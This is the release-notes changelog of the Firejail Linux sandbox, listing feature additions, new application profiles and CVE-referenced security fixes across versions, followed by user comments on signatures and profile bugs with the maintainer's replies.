    installed in ~/.local directory
  * bugfix: temporarily remove private-tmp from all profiles, until a fix for
    .Xauthority file handling in KDE becomes available
  * maintenance: --output cleanup
  * maintenance: updated copyright statement in all files
 -- netblue30   Sat, 18 Mar 2017 10:00:00 -0500

firejail (0.9.44.8) baseline; urgency=low
  * bugfix: fix broken PulseAudio support
 -- netblue30   Wed, 18 Jan 2017 10:00:00 -0500

firejail (0.9.44.6) baseline; urgency=low
  * security: new fix for CVE-2017-5180 reported by Sebastian Krahmer last week; new CVE assigned after the release - CVE-2017-5940
  * security: major cleanup of file copying code
  * security: tightening the rules for --chroot and --overlay features
  * bugfix: ported Gentoo compile patch
  * bugfix: Nvidia drivers bug in --private-dev
  * bugfix: fix ASSERT_PERMS_FD macro
  * feature: allow local customization using .local files under /etc/firejail
    backported from our development branch
  * feature: spoof machine-id backported from our development branch
 -- netblue30   Sun, 15 Jan 2017 10:00:00 -0500

firejail (0.9.44.4) baseline; urgency=low
  * security: --bandwidth root shell found by Martin Carpenter (CVE-2017-5207)
  * security: disabled --allow-debuggers when running on kernel
    versions prior to 4.8; a kernel bug in ptrace system call
    allows a full bypass of seccomp filter; problem reported by
    Lizzie Dixon (CVE-2017-5206)
  * security: root exploit found by Sebastian Krahmer (CVE-2017-5180)
 -- netblue30   Sat, 7 Jan 2017 10:00:00 -0500

firejail (0.9.44.2) baseline; urgency=low
  * security: overwrite /etc/resolv.conf found by Martin Carpenter (CVE-2016-10118)
  * secuirty: TOCTOU exploit for --get and --put found by Daniel Hodson
  * security: invalid environment exploit found by Martin Carpenter (CVE-2016-10122)
  * security: several security enhancements
  * bugfix: crashing VLC by pressing Ctrl-O
  * bugfix: use user configured icons in KDE
  * bugfix: mkdir and mkfile are not applied to private directories
  * bugfix: cannot open files on Deluge running under KDE
  * bugfix: --private=dir where dir is the user home directory
  * bugfix: cannot start Vivaldi browser
  * bugfix: cannot start mupdf
  * bugfix: ssh profile problems
  * bugfix: --quiet
  * bugfix: quiet in git profile
  * bugfix: memory corruption
 -- netblue30   Fri, 2 Dec 2016 08:00:00 -0500

firejail (0.9.44) baseline; urgency=low
  * CVE-2016-9016 submitted by Aleksey Manevich
  * modifs: removed man firejail-config
  * modifs: --private-tmp whitelists /tmp/.X11-unix directory
  * modifs: Nvidia drivers added to --private-dev
  * modifs: /srv supported by --whitelist
  * feature: allow user access to /sys/fs (--noblacklist=/sys/fs)
  * feature: support starting/joining sandbox is a single command
    (--join-or-start)
  * feature: X11 detection support for --audit
  * feature: assign a name to the interface connected to the bridge
    (--veth-name)
  * feature: all user home directories are visible (--allusers)
  * feature: add files to sandbox container (--put)
  * feature: blocking x11 (--x11=block)
  * feature: X11 security extension (--x11=xorg)
  * feature: disable 3D hardware acceleration (--no3d)
  * feature: x11 xpra, x11 xephyr, x11 block, allusers, no3d profile commands
  * feature: move files in sandbox (--put)
  * feature: accept wildcard patterns in user  name field of restricted
    shell login feature
  * new profiles: qpdfview, mupdf, Luminance HDR, Synfig Studio, Gimp, Inkscape
  * new profiles: feh, ranger, zathura, 7z, keepass, keepassx,
  * new profiles: claws-mail, mutt, git, emacs, vim, xpdf, VirtualBox, OpenShot
  * new profiles: Flowblade, Eye of GNOME (eog), Evolution
  * bugfixes
 -- netblue30   Fri, 21 Oct 2016 08:00:00 -0500

firejail (0.9.42) baseline; urgency=low
  * security: --whitelist deleted files, submitted by Vasya Novikov
  * security: disable x32 ABI in seccomp, submitted by Jann Horn
  * security: tighten --chroot, submitted by Jann Horn
  * security: terminal sandbox escape, submitted by Stephan Sokolow
  * security: several TOCTOU fixes submitted by Aleksey Manevich
  * modifs: bringing back --private-home option
  * modifs: deprecated --user option, please use "sudo -u username firejail"
  * modifs: allow symlinks in home directory for --whitelist option
  * modifs: Firejail prompt is enabled by env variable FIREJAIL_PROMPT="yes"
  * modifs: recursive mkdir
  * modifs: include /dev/snd in --private-dev
  * modifs: seccomp filter update
  * modifs: release archives moved to .xz format
  * feature: AppImage support (--appimage)
  * feature: AppArmor support (--apparmor)
  * feature: Ubuntu snap support (/etc/firejail/snap.profile)
  * feature: Sandbox auditing support (--audit)
  * feature: remove environment variable (--rmenv)
  * feature: noexec support (--noexec)
  * feature: clean local overlay storage directory (--overlay-clean)
  * feature: store and reuse overlay (--overlay-named)
  * feature: allow debugging inside the sandbox with gdb and strace
         (--allow-debuggers)
  * feature: mkfile profile command
  * feature: quiet profile command
  * feature: x11 profile command
  * feature: option to fix desktop files (firecfg --fix)
  * compile time: Busybox support (--enable-busybox-workaround)
  * compile time: disable overlayfs (--disable-overlayfs)
  * compile time: disable whitlisting (--disable-whitelist)
  * compile time: disable global config (--disable-globalcfg)
  * run time: enable/disable overlayfs (overlayfs yes/no)
  * run time: enable/disable  quiet as default (quiet-by-default yes/no)
  * run time: user-defined network filter (netfilter-default)
  * run time: enable/disable whitelisting (whitelist yes/no)
  * run time: enable/disable remounting of /proc and /sys
          (remount-proc-sys yes/no)
  * run time: enable/disable chroot desktop features (chroot-desktop yes/no)
  * profiles: Gitter, gThumb, mpv, Franz messenger, LibreOffice
  * profiles: pix, audacity, xz, xzdec, gzip, cpio, less
  * profiles: Atom Beta, Atom, jitsi, eom, uudeview
  * profiles: tar (gtar), unzip, unrar, file, skypeforlinux,
  * profiles: inox, Slack, gnome-chess. Gajim IM client, DOSBox
  * bugfixes
 -- netblue30   Thu, 8 Sept 2016 08:00:00 -0500

firejail (0.9.40) baseline; urgency=low
  * added --nice option
  * added --x11 option
  * added --x11=xpra option
  * added --x11=xephyr option
  * added --cpu.print option
  * added filetransfer options --ls and --get
  * added --writable-etc and --writable-var options
  * added --read-only option
  * added mkdir, ipc-namespace, and nosound profile commands
  * added net, ip, defaultgw, ip6, mac, mtu and iprange profile commands
  * --version also prints compile options
  * --output option also redirects stderr
  * added compile-time option to restrict --net= to root only
  * run time config support, man firejail-config
  * added firecfg utility
  * AppArmor fixes
  * default seccomp filter update
  * disable STUN/WebRTC in default netfilter configuration
  * new profiles: lxterminal, Epiphany, cherrytree, Polari, Vivaldi, Atril
  * new profiles: qutebrowser, SlimJet, Battle for Wesnoth, Hedgewars
  * new profiles: qTox, OpenSSH client, OpenBox, Dillo, cmus, dnsmasq
  * new profiles: PaleMoon, Icedove, abrowser, 0ad, netsurf, Warzone2100
  * new profiles: okular, gwenview, Google-Play-Music-Desktop-Player
  * new profiles: Aweather, Stellarium, gpredict, quiterss, cyberfox
  * new profiles: generic Ubuntu snap application profile, xplayer
  * new profiles: xreader, xviewer, mcabber, Psi+, Corebird, Konversation
  * new profiles: Brave, Gitter
  * generic.profile renamed default.profile
  * build rpm packages using "make rpms"
  * bugfixes
 -- netblue30   Sun, 29 May 2016 08:00:00 -0500

firejail (0.9.38.12) baseline; urgency=low
  * bugfix: detect correct execute permissions for --shell=none
  * bugfix: use an IP address of 0 when ARP-probing for unused IP addresses
  * bugfix: fix cpu entry in firejail-profile man page
  * bugfix: set correct mode for --tmpfs
  * bugfix: accept program names in firejail bash completion
  * bugfix: added --force option to --help screen
  * bugfix: --quiet option
  * bugfix: truncated output in snprintf
  * bugfix: fix handling of /dev/shm in whitelists
  * enhancement: quiet support in profile files
  * maintenance: --output cleanup
  * manitenance: libnetlink cleanup
  * maintenance: updated terminal support in disable-common.inc
  * maintenance: updated copyright statement in all files
  * maintenance: testing suite update for Debian "stretch"
 -- netblue30   Sat, 11 Nov 2017 10:00:00 -0500

firejail (0.9.38.10) baseline; urgency=low
  * security: new fix for CVE-2017-5180 reported by Sebastian Krahmer last week
  * security: tightening the rules for --chroot
  * bugfix: ported Gentoo compile patch
  * bugfix: fix ASSERT_PERMS_FD macro
 -- netblue30   Sun, 15 Jan 2017 10:00:00 -0500

firejail (0.9.38.8) baseline; urgency=low
  * security: root exploit found by Sebastian Krahmer (CVE-2017-5180)
 -- netblue30   Sat, 7 Jan 2017 10:00:00 -0500

firejail (0.9.38.6) baseline; urgency=low
  * security: overwrite /etc/resolv.conf found by Martin Carpenter (CVE-2016-10118)
  * bugfix: crashing VLC by pressing Ctrl-O
 -- netblue30   Fri, 16 Dec 2016 10:00:00 -0500

firejail (0.9.38.4) baseline; urgency=low
  * CVE-2016-7545 submitted by Aleksey Manevich
  * bugfixes
 -- netblue30   Mon, 10 Oct 2016 10:00:00 -0500

firejail (0.9.38.2) baseline; urgency=low
  * security: --whitelist deleted files, submitted by Vasya Novikov
  * security: disable x32 ABI, submitted by Jann Horn
  * security: tighten --chroot, submitted by Jann Horn
  * security: terminal sandbox escape, submitted by Stephan Sokolow
  * feature: clean local overlay storage directory (--overlay-clean)
  * bugfixes
 -- netblue30   Tue, 23 Aug 2016 10:00:00 -0500

firejail (0.9.38) baseline; urgency=low
  * IPv6 support (--ip6 and --netfilter6)
  * --join command enhancement (--join-network, --join-filesystem)
  * added --user command
  * added --disable-network and --disable-userns compile time flags
  * Centos 6 support
  * symlink invocation
  * added KMail, Seamonkey, Telegram, Mathematica, uGet,
  *   and mupen64plus profiles
  * --chroot in user mode allowed only if seccomp support is available
  *   in current Linux kernel (CVE-2016-10123)
  * deprecated --private-home feature
  * the first protocol list installed takes precedence
  * --tmpfs option allowed only running as root (CVE-2016-10117)
  * added --private-tmp option
  * weak permissions (CVE-2016-10119, CVE-2016-10120, CVE-2016-10121)
  * bugfixes
 -- netblue30   Tue, 2 Feb 2016 10:00:00 -0500

firejail (0.9.36) baseline; urgency=low
  * added  unbound, dnscrypt-proxy, BitlBee, HexChat, WeeChat,
     parole and rtorrent profiles
  * Google Chrome profile rework
  * added google-chrome-stable profile
  * added google-chrome-beta profile
  * added google-chrome-unstable profile
  * Opera profile rework
  * added opera-beta profile
  * added --noblacklist option
  * added --profile-path option
  * added --force option
  * whitelist command enhancements
  * prevent user name enumeration
  * added /etc/firejail/nolocal.net network filter
  * added /etc/firejail/webserver.net network filter
  * blacklisting firejail configuration by default
  * allow default gateway configuration for --interface option
  * --debug enhancements: --debug-check-filenames, --debug-blacklists,
    --debug-whitelists
  * filesystem log
  * libtrace enhancements, tracing opendir call
  * added --tracelog option
  * added "name" command to profile files
  * added "hostname" command to profile files
  * added automated feature testing framework
  * Debian reproducible build
  * bugfixes
 -- netblue30   Sun, 27 Dec 2015 09:00:00 -0500

firejail (0.9.34) baseline; urgency=low
  * added --ignore option
  * added --protocol option
  * support dual i386/amd64 seccomp filters
  * added Google Chrome profile
  * added Steam, Skype, Wine and Conkeror profiles
  * bugfixes
 -- netblue30   Sat, 7 Nov 2015 08:00:00 -0500

firejail (0.9.32) baseline; urgency=low
  * added --interface option
  * added --mtu option
  * added --private-bin option
  * added --nosound option
  * added --hostname option
  * added --quiet option
  * added seccomp errno support
  * added FBReader default profile
  * added Spotify default profile
  * lots of default security profile changes
  * fixed a security problem on multi-user systems
  * bugfixes
 -- netblue30   Wed, 21 Oct 2015 08:00:00 -0500

firejail (0.9.30) baseline; urgency=low
  * added a disable-history.inc profile as a result of Firefox PDF.js exploit;
    disable-history.inc included in all default profiles
  * Firefox PDF.js exploit (CVE-2015-4495) fixes
  * added --private-etc option
  * added --env option
  * added --whitelist option
  * support ${HOME} token in include directive in profile files
  * --private.keep is transitioned to --private-home
  * support ~ and blanks in blacklist option
  * support "net none" command in profile files
  * using /etc/firejail/generic.profile by default for user sessions
  * using /etc/firejail/server.profile by default for root sessions
  * added build --enable-fatal-warnings configure option
  * added persistence to --overlay option
  * added --overlay-tmpfs option
  * make install-strip implemented, make install renamed
  * bugfixes
 -- netblue30   Mon, 14 Sept 2015 08:00:00 -0500

firejail (0.9.28) baseline; urgency=low
  * network scanning, --scan option
  * interface MAC address support, --mac option
  * IP address range, --iprange option
  * traffic shaping, --bandwidth option
  * reworked printing of network status at startup
  * man pages rework
  * added firejail-login man page
  * added GNU Icecat, FileZilla, Pidgin, XChat, Empathy, DeaDBeeF default
    profiles
  * added an /etc/firejail/disable-common.inc file to hold common directory
    blacklists
  * blacklist Opera and Chrome/Chromium config directories in profile files
  * support noroot option for profile files
  * enabled noroot in default profile files
  * bugfixes
 -- netblue30   Sat, 1 Aug 2015 08:00:00 -0500

firejail (0.9.26) baseline; urgency=low
  * private dev directory
  * private.keep option for whitelisting home files in a new private directory
  * user namespaces support, noroot option
  * added Deluge and qBittorent profiles
  * bugfixes
 -- netblue30   Thu, 30 Apr 2015 08:00:00 -0500

firejail (0.9.24) baseline; urgency=low
  * whitelist and blacklist seccomp filters
  * doubledash option
  * --shell=none support
  * netfilter file support in profile files
  * dns server support in profile files
  * added --dns.print option
  * added default profiles for Audacious, Clementine, Gnome-MPlayer, Rhythmbox and Totem.
  * added --caps.drop=all in default profiles
  * new syscalls in default seccomp filter: sysfs, sysctl, adjtimex, kcmp
  *         clock_adjtime, lookup_dcookie, perf_event_open, fanotify_init
  * Bugfix: using /proc/sys/kernel/pid_max for the max number of pids
  * two build patches from Reiner Herman (tickets 11, 12)
  * man page patch from Reiner Herman (ticket 13)
  * output patch (ticket 15) from sshirokov

 -- netblue30   Sun, 5 Apr 2015 08:00:00 -0500

firejail (0.9.22) baseline; urgency=low
  * Replaced --noip option with --ip=none
  * Container stdout logging and log rotation
  * Added process_vm_readv, process_vm_writev and mknod to
  *    default seccomp blacklist
  * Added CAP_MKNOD to default caps blacklist
  * Blacklist and whitelist custom Linux capabilities filters
  * macvlan device driver support for --net option
  * DNS server support, --dns option
  * Netfilter support
  * Monitor network statistics, --netstats option
  * Added profile for Mozilla Thunderbird/Icedove
  * - --overlay support for Linux kernels 3.18+
  * Bugfix: preserve .Xauthority file in private mode (test with ssh -X)
  * Bugfix: check uid/gid for cgroup

 -- netblue30   Mon, 9 Mar 2015 09:00:00 -0500

firejail (0.9.20) baseline; urgency=low
  * utmp, btmp and wtmp enhancements
  *    create empty /var/log/wtmp and /var/log/btmp files in sandbox
  *    generate a new /var/run/utmp file in sandbox
  * CPU affinity, --cpu option
  * Linux control groups support, --cgroup option
  * Opera web browser support
  * VLC support
  * Added "empty" attribute to seccomp command to remove the default
  *    syscall list form seccomp blacklist
  * Added --nogroups option to disable supplementary groups for regular
  *   users. root user always runs without supplementary groups.
  * firemon enhancements
  *   display the command that started the sandbox
  *   added --caps option to display capabilities for all sandboxes
  *   added --cgroup option to display the control groups for all sandboxes
  *   added --cpu option to display CPU affinity for all sandboxes
  *   added --seccomp option to display seccomp setting for all sandboxes
  * New compile time options: --disable-chroot, --disable-bind
  * bugfixes

 -- netblue30   Mon, 02 Feb 2015 08:00:00 -0500

firejail (0.9.18) baseline; urgency=low
  * Support for tracing system, setuid, setgid, setfsuid, setfsgid syscalls
  * Support for tracing setreuid, setregid, setresuid, setresguid syscalls
  * Added profiles for transmission-gtk and transmission-qt
  * bugfixes

 -- netblue30   Fri, 25 Dec 2014 10:00:00 -0500

firejail (0.9.16) baseline; urgency=low
  * Configurable private home directory
  * Configurable default user shell
  * Software configuration support for --docdir and DESTDIR
  * Profile file support for include, caps, seccomp and private keywords
  * Dropbox profile file
  * Linux capabilities and seccomp filters enabled by default for Firefox,
  Midori, Evince and Dropbox
  * bugfixes

 -- netblue30   Tue, 4 Nov 2014 10:00:00 -0500

firejail (0.9.14) baseline; urgency=low
  * Linux capabilities and seccomp filters are automatically enabled in
    chroot mode (--chroot option) if the sandbox is started as regular user
  * Added support for user defined seccomp blacklists
  * Added syscall trace support
  * Added --tmpfs option
  * Added --balcklist option
  * Added --read-only option
  * Added --bind option
  * Logging enhancements
  * --overlay option was reactivated
  * Added firemon support to print the ARP table for each sandbox
  * Added firemon support to print the route table for each sandbox
  * Added firemon support to print interface information for each sandbox
  * bugfixes

 -- netblue30   Tue, 15 Oct 2014 10:00:00 -0500

firejail (0.9.12.2) baseline; urgency=low
  * Fix for pulseaudio problems
  * --overlay option was temporarily disabled in this build

 -- netblue30   Mon, 29 Sept 2014 07:00:00 -0500

firejail (0.9.12.1) baseline; urgency=low
  * Fix for pulseaudio problems
  * --overlay option was temporarily disabled in this build

 -- netblue30   Mon, 22 Sept 2014 09:00:00 -0500

firejail (0.9.12) baseline; urgency=low
  * Added capabilities support
  * Added support for CentOS 7
  * bugfixes

 -- netblue30   Mon, 15 Sept 2014 10:00:00 -0500

firejail (0.9.10) baseline; urgency=low
  * Disable /proc/kcore, /proc/kallsyms, /dev/port, /boot
  * Fixed --top option CPU utilization calculation
  * Implemented --tree option in firejail and firemon
  * Implemented --join=name option
  * Implemented --shutdown option
  * Preserve the current working directory if possible
  * Cppcheck and clang errors cleanup
  * Added a Chromium web browser profile

 -- netblue30   Thu, 28 Aug 2014 07:00:00 -0500

firejail (0.9.8.1) baseline; urgency=low
  * FIxed a number of bugs introduced in 0.9.8

 -- netblue30   Fri, 25 Jul 2014 07:25:00 -0500

firejail (0.9.8) baseline; urgency=low
  * Implemented nowrap mode for firejail --list command option
  * Added --top option in both firejail and firemon
  * seccomp filter support
  * Added pid support for firemon
  * bugfixes

 -- netblue30   Tue, 24 Jul 2014 08:51:00 -0500

firejail (0.9.6) baseline; urgency=low

  * Mounting tmpfs on top of /var/log, required by several server programs
  * Server fixes for /var/lib and /var/cache
  * Private mode fixes
  * csh and zsh default shell support
  * Chroot mode fixes
  * Added support for lighttpd, isc-dhcp-server, apache2, nginx, snmpd,

 -- netblue30   Sat, 7 Jun 2014 09:00:00 -0500

firejail (0.9.4) baseline; urgency=low

  * Fixed resolv.conf on Ubuntu systems using DHCP
  * Fixed resolv.conf on Debian systems using resolvconf package
  * Fixed /var/lock directory
  * Fixed /var/tmp directory
  * Fixed symbolic links in profile files
  * Added profiles for evince, midori

 -- netblue30   Sun, 4 May 2014 08:00:00 -0500

firejail (0.9.2) baseline; urgency=low

  * Checking IP address passed with --ip option using ARP; exit if the address
   is already present
  * Using a lock file during ARP address assignment in order to removed a race
   condition.
  * Several fixes to --private option; it also mounts a tmpfs filesystem on top
   of /tmp
  * Added user access check for profile file
  * Added --defaultgw option
  * Added support of --noip option; it is necessary for DHCP setups
  * Added syslog support
  * Added support for "tmpfs" and "read-only" profile commands
  * Added an expect-based testing framework for the project
  * Added bash completion support
  * Added support for multiple networks

 -- netblue30   Fri, 25 Apr 2014 08:00:00 -0500

firejail (0.9) baseline; urgency=low

  * First beta version

 -- netblue30   Sat, 12 Apr 2014 09:00:00 -0500

```

### Share this:

* [Twitter](https://firejail.wordpress.com/download-2/release-notes/?share=twitter "Click to share on Twitter")
* [Facebook](https://firejail.wordpress.com/download-2/release-notes/?share=facebook "Click to share on Facebook")
Like Loading...

## 46 thoughts on “Release Notes”

1. ![](https://1.gravatar.com/avatar/14a07619972c604c27401a6412325e853d36f37f7a09fce30aeb20948004fa90?s=44&d=identicon&r=G)**Emzie** [July 30, 2016 at 1:14 am](https://firejail.wordpress.com/download-2/release-notes/#comment-217)

   Why are your downloads not signed or hashed?

   [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=217&_wpnonce=919fa702ad)Like

   [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=217#respond) ↓
   1. ![](https://2.gravatar.com/avatar/26136ad4c186dba725ed1a997e467e8a8e2a472e7bb67d71a1be2ed46790cc31?s=44&d=identicon&r=G)**[netblue30](http://l3net.wordpress.com)** Post author[August 1, 2016 at 11:37 am](https://firejail.wordpress.com/download-2/release-notes/#comment-218)

      I added signatures for the latest version. Look into .asc file.

      [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=218&_wpnonce=8733db2ebb)Like

      [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=218#respond) ↓
3. ![](https://0.gravatar.com/avatar/f843beafcfc30e0c951ea2886258e77a5e0d8eb9c8c0aaf62ded6d584f57299e?s=44&d=identicon&r=G)**Ken S.** [August 7, 2016 at 12:21 am](https://firejail.wordpress.com/download-2/release-notes/#comment-227)

   Great! Can you confirm the key fingerprint: F951 1649 95F5 C400 6A73 411E 2CCB 36AD FC58 49A7

   [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=227&_wpnonce=edfc6cde52)Like

   [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=227#respond) ↓
   1. ![](https://2.gravatar.com/avatar/26136ad4c186dba725ed1a997e467e8a8e2a472e7bb67d71a1be2ed46790cc31?s=44&d=identicon&r=G)**[netblue30](http://l3net.wordpress.com)** Post author[August 9, 2016 at 1:55 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-231)

      The fingerprint is good. I have the full public key printed on the download page here: <https://firejail.wordpress.com/download-2/>

      [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=231&_wpnonce=4cd6cb8fb5)Like

      [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=231#respond) ↓
5. Pingback: [[CSS] POINTYFEATHER / tar extract pathname bypass (CVE-2016-6321) – sec.uno](https://www.sec.uno/2016/10/27/css-pointyfeather-tar-extract-pathname-bypass-cve-2016-6321-2/)
7. ![](https://0.gravatar.com/avatar/0c553accfa3f5c9944ae33cf76da5342d403dc10438ab37780e1c4cc38cd2123?s=44&d=identicon&r=G)**Sandy** [April 16, 2017 at 1:52 am](https://firejail.wordpress.com/download-2/release-notes/#comment-635)

   There is a fairly new downloader on the scene for Linux that you might consider building a profile for. It is called Persepolis Download Manager. It can be found here: <https://persepolisdm.github.io/> It is similar to Internet Download Manager though it is not at that stage in its development yet.

   [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=635&_wpnonce=6171c7f979)Like

   [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=635#respond) ↓
   1. ![](https://2.gravatar.com/avatar/26136ad4c186dba725ed1a997e467e8a8e2a472e7bb67d71a1be2ed46790cc31?s=44&d=identicon&r=G)**[netblue30](http://l3net.wordpress.com)** Post author[April 18, 2017 at 3:04 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-641)

      Thanks, I’ll take a look.

      [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=641&_wpnonce=2b65e9e3e1)Like

      [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=641#respond) ↓
9. ![](https://0.gravatar.com/avatar/088efe39c81639a9aeb0211b5f8a15bce6634c7b80bfe29795183d658cde2223?s=44&d=identicon&r=G)**David** [April 19, 2017 at 11:52 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-642)

   I downloaded from your site firejail-0.9.44.10-1.x86\_64.rpm and installed it on my Fedora 25 host (fully up-to-date). Seems to work fine.

   However I needed to modify a supplied profile (transmission-gtk.profile), so I copied that to ~/.config/firejail and then ran “firejail transmission-gtk” again to make sure it was working. Nope.

   The problem was that firejail found and started processing my .config copy OK but when it processed the line “include /etc/firejail/disable-common.inc” and attempted to execute the first line of \*that\* file (“include /etc/firejail/disable-common.local”) it failed because “no such file or directory”.

   I then created an (empty \*.local” in /etc/firejail for each of the \*.inc files containing an include directive like this.

   Then everything worked. I don’t know why these “.local” includes don’t cause trouble when the \*.inc

   file found in /etc/firejail is processed by firejail but causes trouble when the \*.inc file is in ~/.config/firejail.

   Suggest you allow these .local files to not-exist, or pre-create empty ones. (I do think having this feature

   is a good idea — \*if\* installing a new release will not override any .local files — as it is handy to be able to

   add restrictions or whatever for generic local consumption in /etc/firejail without having these changes disappear after an update of firejail. Perhaps a separate (sub-)directory in /etc for them would be better…)

   [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=642&_wpnonce=e39abe21d9)Like

   [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=642#respond) ↓
11. ![](https://0.gravatar.com/avatar/088efe39c81639a9aeb0211b5f8a15bce6634c7b80bfe29795183d658cde2223?s=44&d=identicon&r=G)**David** [April 20, 2017 at 1:21 am](https://firejail.wordpress.com/download-2/release-notes/#comment-643)

    I said: “I don’t know why these “.local” includes don’t cause trouble when the \*.inc

    file found in /etc/firejail is processed by firejail but causes trouble when the \*.inc file is in ~/.config/firejail.”

    That was wrong: I meant ” \*.profile file”, not the “\*.inc file”. I.e. I copied transmission-gtk.profile to ~/.config/firejail and \*then\* firejail couldn’t handle the “include….local” inside /etc/firejail/\*.inc files. But obviously firejail was not unhappy when it processed the same transmission-gtk.profile in /etc/firejail.

    Sorry about that.

    [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=643&_wpnonce=2752b1b2c7)Like

    [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=643#respond) ↓
    1. ![](https://2.gravatar.com/avatar/26136ad4c186dba725ed1a997e467e8a8e2a472e7bb67d71a1be2ed46790cc31?s=44&d=identicon&r=G)**[netblue30](http://l3net.wordpress.com)** Post author[April 20, 2017 at 3:03 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-646)

       No problem. Install 0.9.46-rc1 from my download page (<https://sourceforge.net/projects/firejail/files/firejail/>). There are quite a lot of other fixes, including some of the .local profile file handling. 0.9.46 will be released in the next two weeks anyway.

       [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=646&_wpnonce=1bfd3d3265)Like

       [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=646#respond) ↓
13. ![](https://0.gravatar.com/avatar/088efe39c81639a9aeb0211b5f8a15bce6634c7b80bfe29795183d658cde2223?s=44&d=identicon&r=G)**David** [April 20, 2017 at 1:24 am](https://firejail.wordpress.com/download-2/release-notes/#comment-644)

    Note: I really don’t wish to see these “replies” show up in the webpage: I just couldn’t find any other way to send you a bug-report! 🙂

    [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=644&_wpnonce=6b445d431e)Like

    [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=644#respond) ↓
15. ![](https://0.gravatar.com/avatar/088efe39c81639a9aeb0211b5f8a15bce6634c7b80bfe29795183d658cde2223?s=44&d=identicon&r=G)**David** [April 20, 2017 at 4:15 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-647)

    Thanks! I was doubtful about using the rc1 without encouragement such as you have just given. I will do as you suggest.

    [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=647&_wpnonce=576c81a3b6)Like

    [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=647#respond) ↓
17. ![](https://0.gravatar.com/avatar/355e73a37c72d9fa713c9a9ef4a2f0a81b24bab9577a73a1c8ba5315e7fa1b16?s=44&d=identicon&r=G)**GNUser** [June 7, 2017 at 5:18 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-844)

    Hello.

    I am having some issues with the new versions (0.9.46), after running sudo firecfg.

    Namely:

    1. Opening files in file manager won’t call firejail. Example, opening a video file will not make use of firejail or the firejail vlc profile.

    2. Wanting to create a “.local” file to some of the profiles (so I can have my own customization) I tried “sudo gedit” and it didn’t work. Which to a certain extent makes sense (gedit profile has the noroot option, so gedit can’t be exploited). But how do I make use of gedit to edit system configuration files and so on? I used nano for this, but if we have noroot on all of the editors, we will be left with no way to edit our own system.

    3. when I run “firejail –list” I get things like “6865:trisquel:firejail –list ” and “4343:trisquel:/usr/bin/firejail /usr/bin/nautilus -n” and “6847:trisquel:/usr/bin/firejail /usr/bin/vlc –started-from-file”. What are these? Shouldn’t it be “1234:trisquel:firejail nautilus” and “5678:trisquel:firejail vlc” ??

    Thanks!

    [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=844&_wpnonce=ee7c8b7937)Like

    [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=844#respond) ↓
    1. ![](https://2.gravatar.com/avatar/26136ad4c186dba725ed1a997e467e8a8e2a472e7bb67d71a1be2ed46790cc31?s=44&d=identicon&r=G)**[netblue30](http://l3net.wordpress.com)** Post author[June 9, 2017 at 3:38 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-851)

       > 6847:trisquel:/usr/bin/firejail /usr/bin/vlc –started-from-file

       How did you started this? It looks like you clicked on a desktop manager menu or you clicked the video file in the file manager – this is where “–started-from-file” comes from. It should always be there, unless you start vlc manually with “firejail vlc”.

       The desktop manager menus should mostly work, there are here and there some applications that need to be fixed. Most of the problems are with the file manager. On some older distributions (like Ubuntu 16.04 or Debian stable) the mime-type packages are messed up. They have been fixed in later versions (like Ubuntu 17.04, Debian testsing).

       There are lots of problems with the file manager in Gnome 3. We hope Gnome will fix them soon.

       Running gedit as root: “sudo /usr/bin/gedit”. You can also remove the symbolic link for gedit and run it unsandboxed – usually text editors are not a security concern. To remove the link run: “sudo rm /usr/local/bin/gedit”.

       [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=851&_wpnonce=1a4d590ad9)Like

       [Reply](https://firejail.wordpress.com/download-2/release-notes/?replytocom=851#respond) ↓
       1. ![](https://0.gravatar.com/avatar/355e73a37c72d9fa713c9a9ef4a2f0a81b24bab9577a73a1c8ba5315e7fa1b16?s=44&d=identicon&r=G)**GNUser** [June 9, 2017 at 11:52 pm](https://firejail.wordpress.com/download-2/release-notes/#comment-854)

          Why do we have profiles for text editors if they are not a concern?

          Anyway, if I remove the symlink it will be added again when I update firejail and run firecfg right?

          As for the vlc issue, I don’t recall, and right now I have cleaned all symlinks. I am thinking about adding one by one (is that possible? Maybe I should just make a backup copy of all profiles and delete all those I don’t want to have symlinks created?)

          As for my main question: shouldn’t double clicking a mp4 file open vlc INSIDE the firejail sandbox?

          Thanks

          [Like](https://firejail.wordpress.com/download-2/release-notes/?like_comment=854&_wpnonce=f5cc800f51)Like
19. ![](https://0.gravatar.com/avatar/355e73a37c72d9fa713c9a9ef4a2f0a81b24bab9577a73a1c8ba5315e7fa1b16?s=44&d=identicon&r=G)**GNUser** [June 15, 2017 at 12:08 am](https://firejail.wordpress.com/download-2/release-notes/#comment-880)

    Hey,

    Some bug reports:

    The simple-scan profile makes my printer/scanner disappear. I can still print using it but Scanner application says there is no scanner connected to the computer. I have not the time right now to investigate what is happening but want to let you guys know about it. If more info is necessary ask please, in reply to this comment.

